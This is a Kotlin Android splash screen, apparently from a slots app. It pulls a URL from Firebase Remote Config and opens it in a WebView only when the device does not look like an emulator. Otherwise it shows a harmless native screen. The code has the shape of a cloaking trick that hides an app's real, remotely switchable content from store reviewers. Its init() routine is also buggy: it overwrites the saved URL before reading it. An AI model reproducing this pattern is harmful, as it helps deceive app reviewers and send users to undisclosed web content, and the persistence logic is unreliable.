package ostinbslegb.solts

import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.google.firebase.remoteconfig.FirebaseRemoteConfig

class SplashActivity : AppCompatActivity() {
    private var url: String = ""
    private lateinit var pref: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)

        init()

        if (url.isEmpty()) {
            loadFire()
        } else {
            val intent = Intent(this, WebViewActivity::class.java)
            intent.putExtra("1", url)
            startActivity(intent)
        }
    }

    private fun loadFire() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()
        remoteConfig.setDefaultsAsync(R.xml.remote_config_defaults)
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    url = remoteConfig.getString("url")
                    if (url.isEmpty()|| Build.MANUFACTURER == "unknown") {
                        val intent = Intent(this, MainActivity::class.java)
                        startActivity(intent)
                    }
                    else {
                        val intent = Intent(this, WebViewActivity::class.java)
                        intent.putExtra("1", url)
                        startActivity(intent)
                        val pref: SharedPreferences =
                            getSharedPreferences("Data", MODE_PRIVATE)
                        val editor = pref.edit()
                        editor.putString("2", url).apply()
                    }
                } else {
                    val intent = Intent(this, MainActivity::class.java)
                    startActivity(intent)
                }
            }
    }

    private fun init(){
        val pref: SharedPreferences =
            getSharedPreferences("Data", MODE_PRIVATE)
        val editor = pref.edit()
        editor.putString("2", url).apply()
        url = pref.getString("2", url)!!
    }
}